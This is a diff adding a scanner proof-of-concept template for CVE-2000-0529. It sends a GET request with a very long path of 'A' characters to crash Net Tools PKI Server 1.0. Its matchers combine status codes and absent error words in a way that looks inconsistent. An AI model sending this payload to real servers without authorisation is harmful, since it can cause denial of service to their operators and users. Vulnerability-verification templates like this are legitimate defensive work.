@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "通过发送超长 HTTP 请求导致 Net Tools PKI Server 1.0 服务崩溃，验证拒绝服务漏洞存在"
+id = "POC-AVE-2000-0602"
+name = "Network Associates Net Tools PKI Server 1.0 HTTP Server 拒绝服务漏洞 PoC"
+severity = "medium"
+tags = ["cve-2000-0529"]
+vuln_id = [
+    "CVE-2000-0529",
+    "AVE-2000-0602",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    500,
+    503,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "Service Unavailable",
+    "Internal Server Error",
+    "Connection refused",
+]
